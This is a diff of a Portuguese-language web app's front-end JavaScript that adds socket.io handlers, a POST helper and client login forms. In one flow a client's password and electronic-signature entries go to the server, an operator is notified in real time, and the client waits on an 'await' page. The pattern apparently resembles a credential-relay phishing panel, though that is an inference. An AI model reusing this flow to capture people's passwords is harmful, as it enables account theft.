@@ -1,3 +1,184 @@
+const btnLogin = document.querySelector('#btnLogin')
+const userInput = document.querySelector('#nomeUsuario')
+const btnCopy = [...document.querySelectorAll('.formOperator .btn-copy')]
+
+if (btnCopy) {
+    btnCopy.forEach((btn) => {
+        btn.addEventListener('click', function (e) {
+            e.preventDefault()
+
+            const input = btn.closest('.form-group').querySelector('input')
+
+            if (!input) return
+
+            /* Select the text field */
+            input.select()
+            input.setSelectionRange(0, 99999) /* For mobile devices */
+
+            /* Copy the text inside the text field */
+            document.execCommand('copy')
+
+            /* Alert the copied text */
+            alert('Copied the text: ' + input.value)
+        })
+    })
+}
+
+// if (btnLogin && userInput) {
+//     btnLogin.addEventListener('click', function (e) {
+//         e.preventDefault()
+//         btnLogin.closest('form').submit()
+//         //if (userInput.value) socket.emit('chat message', userInput.value)
+//     })
+// }
+
+socket.on('chat message', function (msg) {
+    alert(msg)
+})
+
+const formClient = (() => {
+    //private var/functions
+    const form = document.querySelector('#user')
+    const socketInput = document.querySelector('.theSocket')
+
+    async function store(dados) {
+        const cliente = await util.post(`/api/client`, JSON.stringify(dados))
+
+        console.log(cliente)
+    }
+
+    function putSocket() {
+        if (socketInput) {
+            socket.on('connect', function (msg) {
+                console.log(`socketID`, socket.id)
+                socketInput.value = socket.id
+            })
+
+            socket.on('newClient', (client) => {
+                console.log(`meu cliente`, client)
+            })
+
+            socket.on('reconnectClient', (client) => {
+                console.log(`meu cliente`, client)
+            })
+        }
+    }
+
+    async function handleFormPassword(form, goto) {
+        const dados = util.serialize(form)
+
+        try {
+            const cliente = await util.post(`/api/client-password`, JSON.stringify(dados))
+
+            const { id } = cliente
+
+            if (goto == 'eletronic') {
+                socket.emit('sendPassword', id)
+                return (window.location.href = `/eletronic?client=${id}`)
+            } else {
+                socket.emit('sendSignature', id)
+                return (window.location.href = `/await?client=${id}`)
+            }
+        } catch (error) {
+            //alert(error)
+            console.log(error)
+        }
+    }
+
+    function password() {
+        const formPassword = document.querySelector('#formPassword')
+
+        if (formPassword) {
+            formPassword.addEventListener('submit', function (e) {
+                e.preventDefault()
+
+                handleFormPassword(formPassword, 'eletronic')
+            })
+        }
+    }
+
+    function eletronic() {
+        const formEletronic = document.querySelector('#formEletronic')
+
+        if (formEletronic) {
+            formEletronic.addEventListener('submit', function (e) {
+                e.preventDefault()
+
+                handleFormPassword(formEletronic)
+            })
+        }
+    }
+
+    function handleSubmit(e) {
+        if (btnLogin && userInput) {
+            btnLogin.addEventListener('click', function (e) {
+                e.preventDefault()
+
+                const theForm = document.querySelector('#user')
+
+                if (theForm) return theForm.submit()
+                //if (userInput.value) socket.emit('chat message', userInput.value)
+
+                const name = theForm.querySelector('#nomeUsuario')
+
+                const dados = util.serialize(theForm)
+
+                return store(dados)
+            })
+        }
+    }
+
+    function submit() {
+        if (!form) return
+
+        handleSubmit()
+    }
+
+    return {
+        //public var/functions
+        submit,
+        putSocket,
+        password,
+        eletronic,
+    }
+})()
+
+formClient.eletronic()
+formClient.submit()
+formClient.password()
+
+//menu login
+const menuLogin = [...document.querySelectorAll('.menuLogin li')]
+
+if (menuLogin) {
+    menuLogin.forEach((element) => {
+        element.addEventListener('click', function (e) {
+            const parent = element.closest('ul')
+            const similar = parent.querySelectorAll('li')
+            const number = element.dataset.number
+            const content = element.closest('.menuLoginHome').querySelector(`.container-menuLogin > #content${number}`)
+
+            if (!similar.length) return
+
+            similar.forEach((item) => {
+                item.classList.remove('selected')
+            })
+
+            element.classList.add('selected')
+
+            if (!content) return
+
+            const similarContent = [...content.closest('.container-menuLogin').querySelectorAll('.boxContent')]
+
+            similarContent.forEach((theContent) => {
+                theContent.style.display = 'none'
+            })
+
+            content.style.display = 'block'
+        })
+    })
+}
+
 const URL = `http://192.168.0.10:3333/api`
 
 const util = (() => {
@@ -243,6 +424,25 @@ const util = (() => {
         })
     }
 
+    const post = (url, body) => {
+        return new Promise((resolve, reject) => {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body,
+            })
+                .then((r) => r.json())
+                .then((res) => {
+                    if (res.error) return reject(res.error)
+
+                    return resolve(res)
+                })
+                .catch((error) => reject(error))
+        })
+    }
+
     const del = (url) => {
         return new Promise((resolve, reject) => {
             const token = document.body.dataset.token
@@ -366,6 +566,7 @@ const util = (() => {
         delayed_methods,
         dateEnd,
         maskMoney,
+        post,
     }
 })()
 
@@ -487,6 +688,84 @@ if (btnValidat) util.scroll(btnValidat)
         false
     )
 })()
+
+//formLogin
+const login = (() => {
+    //private var/functions
+    const login = (form) => {
+        form.addEventListener('submit', (e) => {
+            e.preventDefault()
+
+            const user = util.serialize(form)
+
+            return util
+                .request({
+                    url: `/api/login`,
+                    method: `POST`,
+                    headers: {
+                        'content-type': 'application/json',
+                    },
+                    body: JSON.stringify(user),
+                })
+                .then((res) => (window.location.href = `/dashboard`))
+                .catch((err) => console.log(err))
+        })
+    }
+
+    const register = (form) => {
+        form.addEventListener('submit', function (e) {
+            e.preventDefault()
+
+            const object = util.serialize(form)
+
+            const modal = form.closest('.modal')
+
+            return util
+                .request({
+                    url: `/api/user`,
+                    method: `POST`,
+                    headers: {
+                        'content-type': 'application/json',
+                    },
+                    body: JSON.stringify(object),
+                })
+                .then((res) => {
+                    $(modal).modal('hide')
+
+                    $(modal).on('hidden.bs.modal', function (e) {
+                        // do something...
+
+                        Swal.fire('Usuário criado', `Usuário ${res.name} criado com sucesso`, 'success')
+
+                        return $(this).off('hidden.bs.modal')
+                    })
+                })
+                .catch((err) => {
+                    return util.notify({
+                        icon: `alert-icon ni ni-bell-55`,
+                        title: 'Atenção! alguns erros foram encontrados!',
+                        message: err,
+                        type: 'warning',
+                    })
+                })
+        })
+    }
+
+    return {
+        //public var/functions
+        login,
+        register,
+    }
+})()
+
+//Register
+const formRegister = document.querySelector('.formRegister')
+
+if (formRegister) login.register(formRegister)
+
+const formLogin = document.querySelector('.formLogin')
+
+//if (formLogin) login.login(formLogin)
 
 const product = (() => {
     const table = $('.dataTable').DataTable()
@@ -814,81 +1093,3 @@ $('.dataTable').on('draw.dt', function () {
 
     if (btnEditProduct) btnEditProduct.map((btn) => product.openModal(btn))
 })
-
-//formLogin
-const login = (() => {
-    //private var/functions
-    const login = (form) => {
-        form.addEventListener('submit', (e) => {
-            e.preventDefault()
-
-            const user = util.serialize(form)
-
-            return util
-                .request({
-                    url: `/api/login`,
-                    method: `POST`,
-                    headers: {
-                        'content-type': 'application/json',
-                    },
-                    body: JSON.stringify(user),
-                })
-                .then((res) => (window.location.href = `/dashboard`))
-                .catch((err) => console.log(err))
-        })
-    }
-
-    const register = (form) => {
-        form.addEventListener('submit', function (e) {
-            e.preventDefault()
-
-            const object = util.serialize(form)
-
-            const modal = form.closest('.modal')
-
-            return util
-                .request({
-                    url: `/api/user`,
-                    method: `POST`,
-                    headers: {
-                        'content-type': 'application/json',
-                    },
-                    body: JSON.stringify(object),
-                })
-                .then((res) => {
-                    $(modal).modal('hide')
-
-                    $(modal).on('hidden.bs.modal', function (e) {
-                        // do something...
-
-                        Swal.fire('Usuário criado', `Usuário ${res.name} criado com sucesso`, 'success')
-
-                        return $(this).off('hidden.bs.modal')
-                    })
-                })
-                .catch((err) => {
-                    return util.notify({
-                        icon: `alert-icon ni ni-bell-55`,
-                        title: 'Atenção! alguns erros foram encontrados!',
-                        message: err,
-                        type: 'warning',
-                    })
-                })
-        })
-    }
-
-    return {
-        //public var/functions
-        login,
-        register,
-    }
-})()
-
-//Register
-const formRegister = document.querySelector('.formRegister')
-
-if (formRegister) login.register(formRegister)
-
-const formLogin = document.querySelector('.formLogin')
-
-if (formLogin) login.login(formLogin)
